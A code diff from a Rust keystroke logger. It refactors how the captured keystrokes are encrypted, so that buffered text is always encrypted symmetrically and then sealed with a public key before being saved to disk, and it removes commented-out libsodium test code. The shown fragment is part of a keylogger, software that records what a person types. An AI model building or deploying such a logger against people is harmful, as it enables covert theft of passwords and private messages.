@@ -19,29 +19,12 @@ const LOG_LINE_LENGTH: usize = 140;
 const SEALBYTES: usize = 48;
 
 
-pub enum EncryptionType {
-    Symmetric(String),
-    Asymmetric(String),
-    Both { pub_key_loc: String, sym_key_loc: String },
+pub struct EncryptionDetails {
+    pub pub_key_loc: String,
+    pub sym_key_loc: String,
 }
 
-//pub struct KeysInput<'a> {
-//    secret_key_path: &'a str,
-//    public_key_path: &'a str,
-//    asymmetric: bool,
-//}
-
-pub fn key_log(encryption_type: &EncryptionType) {
-//    sodiumoxide::init();
-//    println!("{}", sodiumoxide::version::version_string());
-//    let (pub_key_1, sec_key_1) = box_::gen_keypair();
-//    let encrypted = sealedbox::seal(b"abcdefg",&pub_key_1);
-//    print_in_hex(&encrypted);
-//    println!("{}", encrypted.len());
-//
-//    let decrypted = sealedbox::open(encrypted.as_ref(),&pub_key_1, &sec_key_1).expect("Decryption Error");
-//    print_in_hex(&decrypted);
-//    return;
+pub fn key_log(encryption_type: &EncryptionDetails) {
     let mut to_write_queue = String::new();
 
     let mut key_downed: HashMap<u8, bool> = HashMap::new();
@@ -99,7 +82,7 @@ pub fn key_log(encryption_type: &EncryptionType) {
     }
 }
 
-fn save_string_to_queue(to_write: &String, string_queue: &mut String, encryption_type: &EncryptionType) {
+fn save_string_to_queue(to_write: &String, string_queue: &mut String, encryption_details: &EncryptionDetails) {
     if to_write.is_empty() { return; }
     string_queue.push_str(to_write);
 
@@ -107,11 +90,7 @@ fn save_string_to_queue(to_write: &String, string_queue: &mut String, encryption
     let string_queue_owned = pad(string_queue, LOG_LINE_LENGTH, '-', true);
     string_queue.clear();
     save_encrypted_to_disk(
-        match encryption_type {
-            &EncryptionType::Asymmetric(ref key_loc) => encrypt_asym(string_queue_owned.as_bytes(), &key_loc),
-            &EncryptionType::Symmetric(ref pub_key_loc) => encrypt_sym(string_queue_owned.as_bytes(), &pub_key_loc),
-            &EncryptionType::Both { ref pub_key_loc, ref sym_key_loc } => encrypt_asym(&encrypt_sym(string_queue_owned.as_bytes(), &sym_key_loc), &pub_key_loc)
-        })
+        encrypt_asym(&encrypt_sym(string_queue_owned.as_bytes(), &encryption_details.sym_key_loc),  &encryption_details.pub_key_loc));
 }
 
 fn encrypt_sym(data_to_encrypt: &[u8], key_loc: &str) -> Vec<u8> {
